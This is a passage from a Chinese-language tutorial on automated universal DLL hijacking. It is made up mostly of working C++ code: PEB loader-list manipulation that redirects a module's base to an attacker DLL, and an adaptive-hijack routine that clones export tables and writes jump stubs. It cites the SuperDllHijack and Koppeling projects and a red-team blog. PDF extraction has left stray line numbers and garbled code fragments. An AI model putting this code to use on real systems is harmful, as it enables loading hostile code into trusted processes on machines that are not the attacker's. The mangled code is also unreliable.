    } 
} 
PEB_LDR_DATA* NtGetPebLdr(void* peb) 
{ 
    __asm { 
        mov eax, peb; 
        mov eax, [eax + 0xc]; 
    } 
} 
VOID SuperDllHijack(LPCWSTR dllname, HMODULE hMod) 
{ 
    WCHAR wszDllName[100] = { 0 }; 
    void* peb = NtCurrentPeb(); 
    PEB_LDR_DATA* ldr = NtGetPebLdr(peb); 
    for (LIST_ENTRY* entry = ldr->InLoadOrderModuleList.Blink; 
        entry != (LIST_ENTRY*)(&ldr->InLoadOrderModuleList); 
        entry = entry->Blink) { 
        PLDR_DATA_TABLE_ENTRY data = (PLDR_DATA_TABLE_ENTRY)entry; 
        memset(wszDllName, 0, 100 * 2); 
        memcpy(wszDllName, data->BaseDllName.Buffer, data->BaseDllName.Length); 
        if (!_wcsicmp(wszDllName, dllname)) { 
            data->DllBase = hMod; 
            break; 
        } 
    } 
} 
VOID DllHijack(HMODULE hMod) 
{ 
    TCHAR tszDllPath[MAX_PATH] = { 0 }; 
    GetModuleFileName(hMod, tszDllPath, MAX_PATH); 
    PathRemoveFileSpec(tszDllPath); 
    PathAppend(tszDllPath, TEXT("mydll.dll.1")); 
    HMODULE hMod1 = LoadLibrary(tszDllPath); 
    SuperDllHijack(L"mydll.dll", hMod1); 
} 
BOOL APIENTRY DllMain( HMODULE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved 
                     ) 
{ 
    switch (ul_reason_for_call) 
    { 
    case DLL_PROCESS_ATTACH: 
        DllHijack(hModule); 
        break; 
    case DLL_THREAD_ATTACH: 
    case DLL_THREAD_DETACH: 
    case DLL_PROCESS_DETACH: 
        break; 
    } 
    return TRUE; 
} 
https://github.com/anhkgg/SuperDllHijack
⾃动化通⽤DLL劫持 - 7
C++
缺点是这种⽅式只适⽤于 LoadLibrary 动态加载的⽅式。
在 issue 中有⼈对隐藏性作了讨论 
思路不错，也放上来展示⼀下。
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
#include "pch.h" 
#include  
#include  
#include  
void SuperDllHijack(LPCWSTR dllname) 
{ 
  #if defined(_WIN64) 
    auto peb = PPEB(__readgsqword(0x60)); 
  #else 
    auto peb = PPEB(__readfsdword(0x30)); 
  #endif 
  auto ldr = peb->Ldr; 
  auto lpHead = &ldr->InMemoryOrderModuleList; 
  auto lpCurrent = lpHead; 
  while ((lpCurrent = lpCurrent->Blink) != lpHead) 
  { 
    PLDR_DATA_TABLE_ENTRY dataTable = CONTAINING_RECORD(lpCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); 
    WCHAR wszDllName[100] = { 0 }; 
    memset(wszDllName, 0, 100 * 2); 
    memcpy(wszDllName, dataTable->FullDllName.Buffer, dataTable->FullDllName.Length); 
    if (_wcsicmp(wszDllName, dllname) == 0) { 
      HMODULE hMod1 = LoadLibrary(TEXT("test.dll.1")); 
      dataTable->DllBase = hMod1; 
      break; 
    } 
  } 
} 
BOOL APIENTRY DllMain(HMODULE hModule, 
    DWORD  ul_reason_for_call, 
    LPVOID lpReserved 
) 
{ 
  if (ul_reason_for_call == DLL_PROCESS_ATTACH) { 
    WCHAR ourPath[MAX_PATH]; 
    GetModuleFileNameW(hModule, ourPath, MAX_PATH); 
    SuperDllHijack(ourPath); 
    MessageBox(NULL, TEXT("劫持成功"), TEXT("1"), MB_OK); 
  } 
    return TRUE; 
}
https://github.com/anhkgg/SuperDllHijack/issues/5
⾃动化通⽤DLL劫持 - 8
⾃适应 DLL 劫持
⽼外的⽂章，原⽂：
  研究了⼀种万能 dll，来适
应各种劫持情况。
也提供了⼯具地址，Github：
⽂章对原理研究的也⽐较深⼊。
对于静态加载（在输⼊表中）的 dll，它的调⽤堆栈如下
C++
在进程启动时，会进⾏依赖分析，来检查每个导⼊表中的函数，所以对于静态加载的 dll 劫持，必须要有导出表。
对于导出表的函数地址，是在修补时完成并写⼊ peb→ldr 中的，这部分可以动态修改。
那么如何⾃动化实现对于静态加载 dll 的通⽤劫持呢，
做了⼀个导出表克隆⼯具，在编译好了
的⾃适应 dll 后，可以⽤
这个导出表克隆⼯具把要劫持的 dll 的导出表复制到这个 dll 上，在 dllmain 初始化时修补 IAT 从⽽实现正常加载。
对于动态加载（使⽤ LoadLibrary）的 dll，它的调⽤堆栈如下
https://www.netspi.com/blog/technical/adversary-simulation/adaptive-dll-hijacking/
https://github.com/monoxgas/Koppeling
1
2
3
4
5
6
7
8
ntdll!LdrInitializeThunk e_lfanew); 
  auto ourExportDataDir = &ourHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; 
  if (ourExportDataDir->Size == 0) 
    return FALSE; // Our DLLs doesn't have any exports 
  auto ourExportDirectory = PIMAGE_EXPORT_DIRECTORY(ourBase + ourExportDataDir->VirtualAddress); 
  // Make current header data RW for redirections 
  DWORD oldProtect = 0; 
  if (!VirtualProtect( 
    ourExportDirectory, 
    sizeof(PIMAGE_EXPORT_DIRECTORY), PAGE_READWRITE, 
    &oldProtect)) { 
    return FALSE; 
  } 
  DWORD totalAllocationSize = 0; 
  // Add the size of jumps 
  totalAllocationSize += targetExportDirectory->NumberOfFunctions * (sizeof(jmpPrefix) + sizeof(jmpRax) + sizeof(LP
VOID)); 
  // Add the size of function table 
  totalAllocationSize += targetExportDirectory->NumberOfFunctions * sizeof(INT); 
  // Add total size of names 
  PINT targetAddressOfNames = (PINT)((PBYTE)targetBase + targetExportDirectory->AddressOfNames); 
  for (DWORD i = 0; i NumberOfNames; i++) 
    totalAllocationSize += (DWORD)strlen(((LPCSTR)((PBYTE)targetBase + targetAddressOfNames[i]))) + 1; 
  // Add size of name table 
  totalAllocationSize += targetExportDirectory->NumberOfNames * sizeof(INT); 
  // Add the size of ordinals: 
  totalAllocationSize += targetExportDirectory->NumberOfFunctions * sizeof(USHORT); 
  // Allocate usuable memory for rebuilt export data 
  PBYTE exportData = AllocateUsableMemory((PBYTE)ourBase, totalAllocationSize, PAGE_READWRITE); 
  if (!exportData) 
    return FALSE; 
  PBYTE sideAllocation = exportData; // Used for VirtualProtect later 
  // Copy Function Table 
  PINT newFunctionTable = (PINT)exportData; 
  CopyMemory(newFunctionTable, (PBYTE)targetBase + targetExportDirectory->AddressOfNames, targetExportDirectory->Nu
mberOfFunctions * sizeof(INT)); 
  exportData += targetExportDirectory->NumberOfFunctions * sizeof(INT); 
  ourExportDirectory->AddressOfFunctions = DWORD((PBYTE)newFunctionTable - (PBYTE)ourBase); 
  // Write JMPs and update RVAs in the new function table 
  PINT targetAddressOfFunctions = (PINT)((PBYTE)targetBase + targetExportDirectory->AddressOfFunctions); 
  for (DWORD i = 0; i NumberOfFunctions; i++) { 
    newFunctionTable[i] = DWORD((exportData - (PBYTE)ourBase)); 
    CopyMemory(exportData, jmpPrefix, sizeof(jmpPrefix)); 
    exportData += sizeof(jmpPrefix); 
    PBYTE realAddress = (PBYTE)((PBYTE)targetBase + targetAddressOfFunctions[i]); 
    CopyMemory(exportData, &realAddress, sizeof(LPVOID)); 
    exportData += sizeof(LPVOID); 
    CopyMemory(exportData, jmpRax, sizeof(jmpRax)); 
⾃动化通⽤DLL劫持 - 11
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
    exportData += sizeof(jmpRax); 
  } 
  // Copy Name RVA Table 
  PINT newNameTable = (PINT)exportData; 
  CopyMemory(newNameTable, (PBYTE)targetBase + targetExportDirectory->AddressOfNames, targetExportDirectory->Number
OfNames * sizeof(DWORD)); 
  exportData += targetExportDirectory->NumberOfNames * sizeof(DWORD); 
  ourExportDirectory->AddressOfNames = DWORD(((PBYTE)newNameTable - (PBYTE)ourBase)); 
  // Copy names and apply delta to all the RVAs in the new name table 
  for (DWORD i = 0; i NumberOfNames; i++) { 
    PBYTE realAddress = (PBYTE)((PBYTE)targetBase + targetAddressOfNames[i]); 
    DWORD length = (DWORD)strlen((LPCSTR)realAddress); 
    CopyMemory(exportData, realAddress, length); 
    newNameTable[i] = DWORD((PBYTE)exportData - (PBYTE)ourBase); 
    exportData += (ULONG_PTR)length + 1; 
  } 
  // Copy Ordinal Table 
  PINT newOrdinalTable = (PINT)exportData; 
  CopyMemory(newOrdinalTable, (PBYTE)targetBase + targetExportDirectory->AddressOfNameOrdinals, targetExportDirecto
ry->NumberOfFunctions * sizeof(USHORT)); 
  exportData += targetExportDirectory->NumberOfFunctions * sizeof(USHORT); 
  ourExportDirectory->AddressOfNameOrdinals = DWORD((PBYTE)newOrdinalTable - (PBYTE)ourBase); 
  if (!VirtualProtect( 
    ourExportDirectory, 
    sizeof(PIMAGE_EXPORT_DIRECTORY), oldProtect, 
    &oldProtect)) { 
    return FALSE; 
  } 
  if (!VirtualProtect( 
    sideAllocation, 
    totalAllocationSize, 
    PAGE_EXECUTE_READ, 
    &oldProtect)) { 
    return FALSE; 
  }